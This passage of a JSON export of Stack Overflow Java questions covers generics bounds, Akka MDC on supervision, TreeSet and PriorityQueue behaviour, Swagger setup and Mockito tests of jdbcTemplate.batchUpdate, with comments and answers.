&quot;or&quot; extend S","body":"<p>I am developing a ComboBox (more for context than actual significance), and I would like to know if the &quot;or&quot; operator exists in Java generics. For now, the declaration looks something like that:</p>\n<pre><code>public class SComboBox&lt;T extends ComboBoxItem&gt; extends JPanel {\n</code></pre>\n<p>Where <code>ComboBoxItem</code> is an interface I created for items that can be used in the ComboBox. However, I'd also like to accept <code>String</code> as a type, which seems like a difficult task since:</p>\n<ol>\n<li><code>String</code> is a <code>final class</code> so there's no way anyone could extend it.</li>\n<li>I am not sure if you can put either something like &quot;|&quot; (or) operator, or just outright specify an acceptable class. Since there <strong>is</strong> an &quot;and&quot; operator (<code>&lt;T extends A &amp; B&gt;</code>) I imagined it would make sense to have the &quot;or&quot; (|) as well.</li>\n</ol>\n<p>My question is essentially point 2. Can I, in generics, specify a class I want to accept and/or use something like a &quot;|&quot;? If not, is there any workaround or should I ditch the idea of using generics?</p>\n"},{"tags":["java","akka","akka-typed"],"comments":[{"owner":{"account_id":5994994,"reputation":19189,"user_id":5641244,"display_name":"Levi Ramsey"},"score":0,"creation_date":1639594172,"post_id":70364771,"comment_id":124391113,"body_markdown":"Not out of the box, but note that Lightbend Telemetry (aka Cinnamon), a commercial addon, can propagate the MDC alongside message sends.","body":"Not out of the box, but note that Lightbend Telemetry (aka Cinnamon), a commercial addon, can propagate the MDC alongside message sends."},{"owner":{"account_id":5955901,"reputation":10524,"user_id":4682610,"accept_rate":29,"display_name":"Florian Schaetz"},"score":0,"creation_date":1639642231,"post_id":70364771,"comment_id":124402293,"body_markdown":"Even if I were to consider that, I don&#39;t need to be able to see MDC in another app, I need it during runtime in the application itself for our logging. Sending data to another app to then somehow consolidate it with our logging would be a huge waste of time.","body":"Even if I were to consider that, I don&#39;t need to be able to see MDC in another app, I need it during runtime in the application itself for our logging. Sending data to another app to then somehow consolidate it with our logging would be a huge waste of time."},{"owner":{"account_id":5994994,"reputation":19189,"user_id":5641244,"display_name":"Levi Ramsey"},"score":0,"creation_date":1639689953,"post_id":70364771,"comment_id":124420555,"body_markdown":"Who said anything about another app?","body":"Who said anything about another app?"},{"owner":{"account_id":5994994,"reputation":19189,"user_id":5641244,"display_name":"Levi Ramsey"},"score":0,"creation_date":1639690569,"post_id":70364771,"comment_id":124420739,"body_markdown":"That said, Akka Typed is generally of the opinion that a parent shouldn&#39;t have that level of visibility into the internal workings of its children.  This is made clear from comparing typed supervision to classic supervision: the former gets a simple `ChildFailed` signal, the latter gets the exception that caused the failure.  An MDC is arguably even more detail than that.","body":"That said, Akka Typed is generally of the opinion that a parent shouldn&#39;t have that level of visibility into the internal workings of its children.  This is made clear from comparing typed supervision to classic supervision: the former gets a simple <code>ChildFailed</code> signal, the latter gets the exception that caused the failure.  An MDC is arguably even more detail than that."},{"owner":{"account_id":5955901,"reputation":10524,"user_id":4682610,"accept_rate":29,"display_name":"Florian Schaetz"},"score":0,"creation_date":1639725323,"post_id":70364771,"comment_id":124426727,"body_markdown":"While I don&#39;t disagree, that means that context simply gets lost on supervision, which one could argue is bad, since how can you supervise correctly with an incomplete set of information?","body":"While I don&#39;t disagree, that means that context simply gets lost on supervision, which one could argue is bad, since how can you supervise correctly with an incomplete set of information?"}],"owner":{"account_id":5955901,"reputation":10524,"user_id":4682610,"accept_rate":29,"display_name":"Florian Schaetz"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":73,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639575984,"creation_date":1639575984,"question_id":70364771,"body_markdown":"We are using the MDC by setting it up via\r\n\r\n    Behaviors.withMdc(\r\n     SomeMessageType.class,\r\n     msg -&gt; toMap( msg.getSomeIdentifier() ),\r\n     originalBehavior );\r\n\r\nThis is, in itself, not a problem and works as expected. Unfortunately, it creates a problem with Supervision: We watch our child actors, let them die and the parent will take action then. This also works, only with one problem:\r\n\r\nThe MDC information is lost, when the parent gets the `ChildFailed` signal. This is no surprise, since it&#39;s potentially another thread, definitely another message/signal, thus MDC was cleared. But for the parent logging, it would be nice to have access to the child&#39;s MDC when it crashed. \r\n\r\nIs this possible out of the box or will we have to somehow implement it ourselves, for example by caching that information?\r\n","title":"Akka Typed: MDC on ChildFailed","body":"<p>We are using the MDC by setting it up via</p>\n<pre><code>Behaviors.withMdc(\n SomeMessageType.class,\n msg -&gt; toMap( msg.getSomeIdentifier() ),\n originalBehavior );\n</code></pre>\n<p>This is, in itself, not a problem and works as expected. Unfortunately, it creates a problem with Supervision: We watch our child actors, let them die and the parent will take action then. This also works, only with one problem:</p>\n<p>The MDC information is lost, when the parent gets the <code>ChildFailed</code> signal. This is no surprise, since it's potentially another thread, definitely another message/signal, thus MDC was cleared. But for the parent logging, it would be nice to have access to the child's MDC when it crashed.</p>\n<p>Is this possible out of the box or will we have to somehow implement it ourselves, for example by caching that information?</p>\n"},{"tags":["java","null","treeset"],"comments":[{"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"display_name":"user16320675"},"score":1,"creation_date":1639575457,"post_id":70364079,"comment_id":124383278,"body_markdown":"*&quot;As you can see&quot;* - sorry, I cannot! I have no idea what `SemiCircle` is (just its name) nor what exactly is meant by *&quot;sorted based on a value&quot;* (based? which value?)","body":"<i>&quot;As you can see&quot;</i> - sorry, I cannot! I have no idea what <code>SemiCircle</code> is (just its name) nor what exactly is meant by <i>&quot;sorted based on a value&quot;</i> (based? which value?)"},{"owner":{"account_id":6933043,"reputation":43,"user_id":5321960,"display_name":"Matthias K."},"score":0,"creation_date":1639575713,"post_id":70364079,"comment_id":124383390,"body_markdown":"I updated the question with the printed keys that I use.","body":"I updated the question with the printed keys that I use."},{"owner":{"account_id":2053598,"reputation":41316,"user_id":1831987,"display_name":"VGR"},"score":0,"creation_date":1639582506,"post_id":70364079,"comment_id":124386610,"body_markdown":"This is entirely based on how the SemiCircle elements are being compared.  Did you create your TreeSet with a custom Comparator?  If so, edit your question and show us the code of that Comparator.  If not, show us the `compareTo` method of SemiCircle.","body":"This is entirely based on how the SemiCircle elements are being compared.  Did you create your TreeSet with a custom Comparator?  If so, edit your question and show us the code of that Comparator.  If not, show us the <code>compareTo</code> method of SemiCircle."},{"owner":{"account_id":6933043,"reputation":43,"user_id":5321960,"display_name":"Matthias K."},"score":0,"creation_date":1639587641,"post_id":70364079,"comment_id":124388635,"body_markdown":"The semi-circles in TreeSet are compared based on the key value. They are just sorted from lowest to highest. I&#39;m using TreeSet since I require insert/remove/contain operations to be performed in O(log n)","body":"The semi-circles in TreeSet are compared based on the key value. They are just sorted from lowest to highest. I&#39;m using TreeSet since I require insert/remove/contain operations to be performed in O(log n)"},{"owner":{"account_id":6933043,"reputation":43,"user_id":5321960,"display_name":"Matthias K."},"score":0,"creation_date":1639683845,"post_id":70364079,"comment_id":124418545,"body_markdown":"If you want to reproduce I&#39;d suggest just keeping a TreeSet with the given keys as elements. That is what the set contains when the &quot;error&quot; happens.","body":"If you want to reproduce I&#39;d suggest just keeping a TreeSet with the given keys as elements. That is what the set contains when the &quot;error&quot; happens."},{"owner":{"account_id":6933043,"reputation":43,"user_id":5321960,"display_name":"Matthias K."},"score":0,"creation_date":1639698857,"post_id":70364079,"comment_id":124422700,"body_markdown":"I resolved the issue. A &quot;NaN&quot; value got introduced after a calculation because of a very small negative number under a square root. This resulted in the higher() function returning null.","body":"I resolved the issue. A &quot;NaN&quot; value got introduced after a calculation because of a very small negative number under a square root. This resulted in the higher() function returning null."}],"owner":{"account_id":6933043,"reputation":43,"user_id":5321960,"display_name":"Matthias K."},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":111,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1639575688,"creation_date":1639572994,"question_id":70364079,"body_markdown":"I&#39;m currently working on a project for which I use a TreeSet. The set is sorted based on a value. At some point in time, I want to get the right neighbour of a certain &quot;key&quot; value, which does exist and shows up in the debug with the correct values, yet the higher() method still returns null and I have no idea why.\r\n\r\nHere is the test code and the debug-output.\r\n\r\n    //  Find the predecessor and successor\r\n    SemiCircle lower = status.lower(circle.getLeft());\r\n    SemiCircle higher = status.higher(circle.getRight());\r\n\r\nThe status is the TreeSet in this case. This is what it looks like upon searching for the lower and higher value:\r\n\r\n    SemiCircle{parent=0.3 0.8 0.2, isOnLeft=true, key=0.2826}          // This is circle.getLeft()\r\n    SemiCircle{parent=0.3 0.8 0.2, isOnLeft=false, key=0.3173}         // This is circle.getRight()\r\n    SemiCircle{parent=0.6 0.5 0.3, isOnLeft=true, key=0.3174}\r\n    SemiCircle{parent=0.6 0.5 0.3, isOnLeft=false, key=0.8825}\r\n\r\nAs you can see, lower should return null and higher should return the 3th semi-circle in the set, however it just returns null. Is there something I&#39;m missing?\r\n\r\nEdit: A SemiCircle is half a circle. It keeps the original circle, whether it is the left-half circle or the right and the &quot;key&quot; as explained above.","title":"TreeSet &quot;higher()&quot; returns null when it shouldn&#39;t?","body":"<p>I'm currently working on a project for which I use a TreeSet. The set is sorted based on a value. At some point in time, I want to get the right neighbour of a certain &quot;key&quot; value, which does exist and shows up in the debug with the correct values, yet the higher() method still returns null and I have no idea why.</p>\n<p>Here is the test code and the debug-output.</p>\n<pre><code>//  Find the predecessor and successor\nSemiCircle lower = status.lower(circle.getLeft());\nSemiCircle higher = status.higher(circle.getRight());\n</code></pre>\n<p>The status is the TreeSet in this case. This is what it looks like upon searching for the lower and higher value:</p>\n<pre><code>SemiCircle{parent=0.3 0.8 0.2, isOnLeft=true, key=0.2826}          // This is circle.getLeft()\nSemiCircle{parent=0.3 0.8 0.2, isOnLeft=false, key=0.3173}         // This is circle.getRight()\nSemiCircle{parent=0.6 0.5 0.3, isOnLeft=true, key=0.3174}\nSemiCircle{parent=0.6 0.5 0.3, isOnLeft=false, key=0.8825}\n</code></pre>\n<p>As you can see, lower should return null and higher should return the 3th semi-circle in the set, however it just returns null. Is there something I'm missing?</p>\n<p>Edit: A SemiCircle is half a circle. It keeps the original circle, whether it is the left-half circle or the right and the &quot;key&quot; as explained above.</p>\n"},{"tags":["java","sorting","collections","priority-queue","heap"],"answers":[{"tags":[],"owner":{"account_id":13429972,"reputation":1807,"user_id":9690075,"display_name":"zysaaa"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639535523,"creation_date":1639535523,"answer_id":70357801,"question_id":70357674,"body_markdown":"You are actually iterating this queue by [for-each][1] loop:\r\n```\r\nfor (char c : minHeap) {\r\n     result.append(c);\r\n}\r\n```\r\nSo getting one element per iteration does not rebuild the heap. See ```PriorityQueue#Itr#next```.\r\n\r\nTry:\r\n```\r\nwhile (!minHeap.isEmpty()) {\r\n    result.append(minHeap.poll());\r\n}\r\n```\r\n\r\n\r\n  [1]: https://www.baeldung.com/foreach-java","title":"I have a String I need to sort based on a custom order and I am using priority queues but the priority queue fails with duplicates","body":"<p>You are actually iterating this queue by <a href=\"https://www.baeldung.com/foreach-java\" rel=\"nofollow noreferrer\">for-each</a> loop:</p>\n<pre><code>for (char c : minHeap) {\n     result.append(c);\n}\n</code></pre>\n<p>So getting one element per iteration does not rebuild the heap. See <code>PriorityQueue#Itr#next</code>.</p>\n<p>Try:</p>\n<pre><code>while (!minHeap.isEmpty()) {\n    result.append(minHeap.poll());\n}\n</code></pre>\n"}],"owner":{"account_id":6268565,"reputation":1,"user_id":4873428,"display_name":"Darshan Simha"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":78,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1639575584,"answer_count":1,"score":0,"last_activity_date":1639575615,"creation_date":1639534192,"question_id":70357674,"body_markdown":"    public class CustomSortString {\r\n\r\n\tpublic String customSortString(String order, String s) {\r\n\t\tif (order == null || s == null) {\r\n\t\t\treturn &quot;&quot;;\r\n\t\t}\r\n\t\tint len = s.length();\r\n\t\tPriorityQueue&lt;Character&gt; minHeap = new PriorityQueue&lt;&gt;(len, (a, b) -&gt; {\r\n\t\t\tif (order.indexOf(a) &gt; order.indexOf(b)) {\r\n\t\t\t\treturn 1;\r\n\t\t\t} else if (order.indexOf(a) &lt; order.indexOf(b)) {\r\n\t\t\t\treturn -1;\r\n\t\t\t} else {\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t});\r\n\t\tStringBuilder result = new StringBuilder();\r\n\t\tfor (int i = 0; i &lt; len; i++) {\r\n\t\t\tminHeap.add(s.charAt(i));\r\n\t\t}\r\n\t\tfor (char c : minHeap) {\r\n\t\t\tresult.append(c);\r\n\t\t}\r\n\t\treturn result.toString();\r\n\t}\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tCustomSortString c = new CustomSortString();\r\n\t\tSystem.out.println(c.customSortString(&quot;kqep&quot;, &quot;pekeq&quot;));\r\n\t}\r\n\r\n}\r\n\r\nBut this does not provide desired results. Because when I look at the minHeap after I add all elements I see the problem :\r\n[enter image description here][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/HnozO.png\r\n\r\nthe &#39;e&#39; s don&#39;t have the same score for some reason and that is causing the program to fail. Can you please help?","title":"I have a String I need to sort based on a custom order and I am using priority queues but the priority queue fails with duplicates","body":"<pre><code>public class CustomSortString {\n\npublic String customSortString(String order, String s) {\n    if (order == null || s == null) {\n        return &quot;&quot;;\n    }\n    int len = s.length();\n    PriorityQueue&lt;Character&gt; minHeap = new PriorityQueue&lt;&gt;(len, (a, b) -&gt; {\n        if (order.indexOf(a) &gt; order.indexOf(b)) {\n            return 1;\n        } else if (order.indexOf(a) &lt; order.indexOf(b)) {\n            return -1;\n        } else {\n            return 0;\n        }\n    });\n    StringBuilder result = new StringBuilder();\n    for (int i = 0; i &lt; len; i++) {\n        minHeap.add(s.charAt(i));\n    }\n    for (char c : minHeap) {\n        result.append(c);\n    }\n    return result.toString();\n}\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    CustomSortString c = new CustomSortString();\n    System.out.println(c.customSortString(&quot;kqep&quot;, &quot;pekeq&quot;));\n}\n</code></pre>\n<p>}</p>\n<p>But this does not provide desired results. Because when I look at the minHeap after I add all elements I see the problem :\n<a href=\"https://i.stack.imgur.com/HnozO.png\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n<p>the 'e' s don't have the same score for some reason and that is causing the program to fail. Can you please help?</p>\n"},{"tags":["java","collections","wildcard","extends","generic-type-parameters"],"comments":[{"owner":{"account_id":6651855,"reputation":224830,"user_id":5133585,"accept_rate":96,"display_name":"Sweeper"},"score":1,"creation_date":1639567904,"post_id":70362856,"comment_id":124380205,"body_markdown":"Cannot reproduce. Does the method actually take `Class&lt;Collection&gt;` instead (not `Class&lt;? extends Collection&gt;`)?","body":"Cannot reproduce. Does the method actually take <code>Class&lt;Collection&gt;</code> instead (not <code>Class&lt;? extends Collection&gt;</code>)?"},{"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"score":0,"creation_date":1639567989,"post_id":70362856,"comment_id":124380234,"body_markdown":"Why not pass in a `Supplier` of the relevant type?","body":"Why not pass in a <code>Supplier</code> of the relevant type?"},{"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"score":0,"creation_date":1639569534,"post_id":70362856,"comment_id":124380865,"body_markdown":"I do have `Class&lt;? extends Collection&gt;` written in the method signature but the IDE I&#39;m using (IntelliJ) marks the method as it expects `Class&lt;Collection&gt;` when using it on my test class. Why does this occur? @Sweeper","body":"I do have <code>Class&lt;? extends Collection&gt;</code> written in the method signature but the IDE I&#39;m using (IntelliJ) marks the method as it expects <code>Class&lt;Collection&gt;</code> when using it on my test class. Why does this occur? @Sweeper"},{"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"score":0,"creation_date":1639570338,"post_id":70362856,"comment_id":124381152,"body_markdown":"I did change the method signature to try the `Supplier` option as @AndyTurner suggested. This time, the error states that the rquired type must be `Supplier&lt;Class&lt;? extends Collection&gt;&gt;`, but `Supplier&lt;Class&lt;List&gt;&gt;` was provided.","body":"I did change the method signature to try the <code>Supplier</code> option as @AndyTurner suggested. This time, the error states that the rquired type must be <code>Supplier&lt;Class&lt;? extends Collection&gt;&gt;</code>, but <code>Supplier&lt;Class&lt;List&gt;&gt;</code> was provided."},{"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"score":0,"creation_date":1639570499,"post_id":70362856,"comment_id":124381205,"body_markdown":"No, not `Supplier&lt;Class&lt;...&gt;&gt;`, `Supplier&lt;C&gt;`, where `C` is a type variable bounded by `Collection`.","body":"No, not <code>Supplier&lt;Class&lt;...&gt;&gt;</code>, <code>Supplier&lt;C&gt;</code>, where <code>C</code> is a type variable bounded by <code>Collection</code>."},{"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"score":0,"creation_date":1639572301,"post_id":70362856,"comment_id":124381916,"body_markdown":"In my use case, I need `Class&lt;...&gt;` because I want to use it to create instances of `Collection` with the Jackson method `objectMapper.getTypeFactory().constructCollectionType()`, which accepts `(Class&lt;? extends java.util.Collection&gt; collectionClass, Class&lt;?&gt; elementClass`. The idea is to transform `elementClass` collection to the specific subiterface desired. @AndyTurner","body":"In my use case, I need <code>Class&lt;...&gt;</code> because I want to use it to create instances of <code>Collection</code> with the Jackson method <code>objectMapper.getTypeFactory().constructCollectionType()</code>, which accepts <code>(Class&lt;? extends java.util.Collection&gt; collectionClass, Class&lt;?&gt; elementClass</code>. The idea is to transform <code>elementClass</code> collection to the specific subiterface desired. @AndyTurner"},{"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"score":0,"creation_date":1639580806,"post_id":70362856,"comment_id":124385818,"body_markdown":"Wanting to pass a `Class` is a bad idea, because they are always rawly-typed (i.e. `Collection`, not `Collection&lt;String&gt;`). If what you want to do is to create a `Collection&lt;E&gt;`, pass in a thing which will _give you_ a `Collection&lt;E&gt;`, not merely a `Collection`, which you then have to unsafely cast in order to get it non-rawly typed.","body":"Wanting to pass a <code>Class</code> is a bad idea, because they are always rawly-typed (i.e. <code>Collection</code>, not <code>Collection&lt;String&gt;</code>). If what you want to do is to create a <code>Collection&lt;E&gt;</code>, pass in a thing which will <i>give you</i> a <code>Collection&lt;E&gt;</code>, not merely a <code>Collection</code>, which you then have to unsafely cast in order to get it non-rawly typed."},{"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"score":0,"creation_date":1639583646,"post_id":70362856,"comment_id":124387092,"body_markdown":"Thank you! I ended up doing it like you just proposed and solved the issue with some little changes. @AndyTurner","body":"Thank you! I ended up doing it like you just proposed and solved the issue with some little changes. @AndyTurner"}],"answers":[{"tags":[],"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1639575182,"creation_date":1639575182,"answer_id":70364584,"question_id":70362856,"body_markdown":"The usage of `Class&lt;? extends Collection&gt;` is, in fact, correct. The problem that I had did refer to the return type of the method, not being able to cast `Collection&lt;T&gt;`to `List&lt;T&gt;`.","title":"Use Class&lt;? extends Collection&gt; as a method signature","body":"<p>The usage of <code>Class&lt;? extends Collection&gt;</code> is, in fact, correct. The problem that I had did refer to the return type of the method, not being able to cast <code>Collection&lt;T&gt;</code>to <code>List&lt;T&gt;</code>.</p>\n"}],"owner":{"account_id":20571153,"reputation":37,"user_id":15099460,"display_name":"Darkhorrow"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":446,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"accepted_answer_id":70364584,"answer_count":1,"score":-2,"last_activity_date":1639575552,"creation_date":1639567555,"question_id":70362856,"body_markdown":"In the method signature, I need a parameter that is any class type that extends from Collection (List, Set, etc), so I can return any of them.\r\n\r\nTo try to achieve this I did use the following method:\r\n\r\n    public Collection&lt;T&gt; method(Class&lt;? extends Collection&gt; collectionType) {\r\n        // Do something...\r\n    }\r\n\r\nHowever when I try to use it like:\r\n\r\n    method(List.class);\r\n\r\nThe following error arises:\r\n\r\n    Error: java: incompatible types: java.lang.Class&lt;java.util.List&gt; cannot be converted to java.lang.Class&lt;java.util.Collection&gt;\r\n\r\nI did search for an answer already solved in Stackoverflow, finding this post: https://stackoverflow.com/questions/47459073/java-class-extends-collection\r\n\r\nBut it does not help me to understand the error. I think I&#39;m not understanding the wildcard (?) usage.","title":"Use Class&lt;? extends Collection&gt; as a method signature","body":"<p>In the method signature, I need a parameter that is any class type that extends from Collection (List, Set, etc), so I can return any of them.</p>\n<p>To try to achieve this I did use the following method:</p>\n<pre><code>public Collection&lt;T&gt; method(Class&lt;? extends Collection&gt; collectionType) {\n    // Do something...\n}\n</code></pre>\n<p>However when I try to use it like:</p>\n<pre><code>method(List.class);\n</code></pre>\n<p>The following error arises:</p>\n<pre><code>Error: java: incompatible types: java.lang.Class&lt;java.util.List&gt; cannot be converted to java.lang.Class&lt;java.util.Collection&gt;\n</code></pre>\n<p>I did search for an answer already solved in Stackoverflow, finding this post: <a href=\"https://stackoverflow.com/questions/47459073/java-class-extends-collection\">Java - Class&lt;? extends Collection&gt;</a></p>\n<p>But it does not help me to understand the error. I think I'm not understanding the wildcard (?) usage.</p>\n"},{"tags":["java","swagger"],"comments":[{"owner":{"account_id":2411568,"reputation":15860,"user_id":2106516,"accept_rate":91,"display_name":"tmarwen"},"score":1,"creation_date":1639565706,"post_id":70362370,"comment_id":124379365,"body_markdown":"Are you using any frameworks under the hood? It is quite difficult to point to a direction if you do not afford much details on how your application setup looks like already.","body":"Are you using any frameworks under the hood? It is quite difficult to point to a direction if you do not afford much details on how your application setup looks like already."},{"owner":{"account_id":9447399,"reputation":41,"user_id":7025577,"display_name":"Ivan Codo"},"score":0,"creation_date":1639575381,"post_id":70362370,"comment_id":124383250,"body_markdown":"Sorry, my fault. Yes, I&#39;m using spring boot.","body":"Sorry, my fault. Yes, I&#39;m using spring boot."}],"owner":{"account_id":9447399,"reputation":41,"user_id":7025577,"display_name":"Ivan Codo"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":314,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639575432,"creation_date":1639565429,"question_id":70362370,"body_markdown":"I have a spring boot application that makes use of a library, and both use swagger to generate documentation. Right now what I see when I access the swagger main page is a combo box with two options, one for the main application, and another one for the library. So far so good. The problem is that we decided to serve the documentation of the main application in a static file, but the library should remain as it is now, annotation-based.\r\n\r\nDoes anyone know how to mix a static file and an annotation-based one?\r\n\r\nIf it is not possible, I can generate the yaml file of the library and serve it as a static one as well, it should be ok, but in this case, how can I serve both files and show them in a combo so the users can choose which one they want to visualize?\r\n\r\n\r\n\r\nThanks in advance for any help.\r\n\r\n","title":"Swagger - working with dynamic and static files","body":"<p>I have a spring boot application that makes use of a library, and both use swagger to generate documentation. Right now what I see when I access the swagger main page is a combo box with two options, one for the main application, and another one for the library. So far so good. The problem is that we decided to serve the documentation of the main application in a static file, but the library should remain as it is now, annotation-based.</p>\n<p>Does anyone know how to mix a static file and an annotation-based one?</p>\n<p>If it is not possible, I can generate the yaml file of the library and serve it as a static one as well, it should be ok, but in this case, how can I serve both files and show them in a combo so the users can choose which one they want to visualize?</p>\n<p>Thanks in advance for any help.</p>\n"},{"tags":["java","unit-testing","junit","mockito","jdbctemplate"],"answers":[{"tags":[],"owner":{"account_id":100270,"reputation":127164,"user_id":270371,"accept_rate":33,"display_name":"davidxxx"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1595661274,"creation_date":1595661274,"answer_id":63085497,"question_id":63085027,"body_markdown":"Here the difficulty is that the  `new BatchPreparedStatementSetter(){ ...}` instance that contains the main logic that you want to test is a implementation detail of the `updateData()` method. It is defined **only** inside the tested method.    \r\nTo solve that you have two classic approaches : \r\n- favor a test slice with `@DataJpaTest` (that is finally a partial integration test) that would be simpler since you will be able to test side effect and also more helpful as you assert the state in the DB and not the statements in your code.    \r\n- Extract the `BatchPreparedStatementSetter` instance creation in a factory.   \r\nIn that way you could capture it inside your unit test.   \r\n\r\nFor example : \r\n\r\n    @Service\r\n    class BatchPreparedStatementFactory{\r\n    \r\n       public BatchPreparedStatementSetter ofStudentsBatchPreparedStatementSetter(List&lt;Student&gt; students, String status){\r\n    \r\n          return \r\n          new BatchPreparedStatementSetter(){\r\n            \r\n                    @Override\r\n                    public int getBatchSize()\r\n                      return students.size();\r\n                    }  \r\n                    @Override\r\n                    public void setValues(PreparedStatement ps int i){\r\n                      Student student = students.get(i);\r\n                      ps.setInt(1, student.getRollNo());\r\n                      ps.setString(2, student.getName());            \r\n                     }\r\n              });\r\n         }\r\n    }\r\n\r\nAnd use it now in your original code : \r\n\r\n     // inject it\r\n     BatchPreparedStatementFactory batchPreparedStatementFactory;\r\n\r\n     public void updateData(List&lt;Student&gt; students, String status){\r\n        try{jdbcTemplate.batchUpdate(&quot;update query&quot;, batchPreparedStatementFactory.ofStudentsBatchPreparedStatementSetter(students, status );\r\n        }catch(Exception ex){}    \r\n      }\r\n\r\n\r\nNow you have two components and so two tests : \r\n- `BatchPreparedStatementFactoryTest` (without mocking) which tests `getBatchSize()` and `setValues()`. That is very straight.\r\n- your initial test (with mocking) that asserts that the `jdbcTemplate.batchUpdate()` is invoked with expected parameters, particularly the instance returned by `BatchPreparedStatementFactory.ofStudentsBatchPreparedStatementSetter(...)`.  \r\nTo do that assertion, you should define several mocks : \r\n`jdbcTemplate`, `BatchPreparedStatementFactory` and `BatchPreparedStatementSetter`.  \r\n\r\nFor example for the second case : \r\n\r\n    // mock the factory return\r\n    BatchPreparedStatementSetter batchPreparedStatementSetterDummyMock = Mockito.mock(BatchPreparedStatementSetter.class);\r\n    Mockito.when(batchPreparedStatementFactoryMock.ofStudentsBatchPreparedStatementSetter(students, status))\r\n      .thenReturn(batchPreparedStatementSetterDummyMock);\r\n    \r\n    // call the method to test\r\n    updateData(students, status);\r\n\r\n    // verify that we call the factory with the expected params\r\n     Mockito.verify(jdbcTemplateMock)\r\n            .batchUpdate(&quot;update query&quot;, batchPreparedStatementSetterDummyMock);\r\n\r\nPersonally I am not a big fan of that kind of unit tests with too fine mocking. I would stick to `@DataJpaTest` or more global integration tests to assert things related to JDBC/JPA.   ","title":"Write unit test for jdbcTemplate.batchUpdate() method","body":"<p>Here the difficulty is that the  <code>new BatchPreparedStatementSetter(){ ...}</code> instance that contains the main logic that you want to test is a implementation detail of the <code>updateData()</code> method. It is defined <strong>only</strong> inside the tested method.<br />\nTo solve that you have two classic approaches :</p>\n<ul>\n<li>favor a test slice with <code>@DataJpaTest</code> (that is finally a partial integration test) that would be simpler since you will be able to test side effect and also more helpful as you assert the state in the DB and not the statements in your code.</li>\n<li>Extract the <code>BatchPreparedStatementSetter</code> instance creation in a factory.<br />\nIn that way you could capture it inside your unit test.</li>\n</ul>\n<p>For example :</p>\n<pre><code>@Service\nclass BatchPreparedStatementFactory{\n\n   public BatchPreparedStatementSetter ofStudentsBatchPreparedStatementSetter(List&lt;Student&gt; students, String status){\n\n      return \n      new BatchPreparedStatementSetter(){\n        \n                @Override\n                public int getBatchSize()\n                  return students.size();\n                }  \n                @Override\n                public void setValues(PreparedStatement ps int i){\n                  Student student = students.get(i);\n                  ps.setInt(1, student.getRollNo());\n                  ps.setString(2, student.getName());            \n                 }\n          });\n     }\n}\n</code></pre>\n<p>And use it now in your original code :</p>\n<pre><code> // inject it\n BatchPreparedStatementFactory batchPreparedStatementFactory;\n\n public void updateData(List&lt;Student&gt; students, String status){\n    try{jdbcTemplate.batchUpdate(&quot;update query&quot;, batchPreparedStatementFactory.ofStudentsBatchPreparedStatementSetter(students, status );\n    }catch(Exception ex){}    \n  }\n</code></pre>\n<p>Now you have two components and so two tests :</p>\n<ul>\n<li><code>BatchPreparedStatementFactoryTest</code> (without mocking) which tests <code>getBatchSize()</code> and <code>setValues()</code>. That is very straight.</li>\n<li>your initial test (with mocking) that asserts that the <code>jdbcTemplate.batchUpdate()</code> is invoked with expected parameters, particularly the instance returned by <code>BatchPreparedStatementFactory.ofStudentsBatchPreparedStatementSetter(...)</code>.<br />\nTo do that assertion, you should define several mocks :\n<code>jdbcTemplate</code>, <code>BatchPreparedStatementFactory</code> and <code>BatchPreparedStatementSetter</code>.</li>\n</ul>\n<p>For example for the second case :</p>\n<pre><code>// mock the factory return\nBatchPreparedStatementSetter batchPreparedStatementSetterDummyMock = Mockito.mock(BatchPreparedStatementSetter.class);\nMockito.when(batchPreparedStatementFactoryMock.ofStudentsBatchPreparedStatementSetter(students, status))\n  .thenReturn(batchPreparedStatementSetterDummyMock);\n\n// call the method to test\nupdateData(students, status);\n\n// verify that we call the factory with the expected params\n Mockito.verify(jdbcTemplateMock)\n        .batchUpdate(&quot;update query&quot;, batchPreparedStatementSetterDummyMock);\n</code></pre>\n<p>Personally I am not a big fan of that kind of unit tests with too fine mocking. I would stick to <code>@DataJpaTest</code> or more global integration tests to assert things related to JDBC/JPA.</p>\n"},{"tags":[],"owner":{"account_id":8945553,"reputation":3776,"user_id":6673165,"display_name":"Shivam Pandey"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639575120,"creation_date":1639575120,"answer_id":70364567,"question_id":63085027,"body_markdown":"As @davidxxx answered, 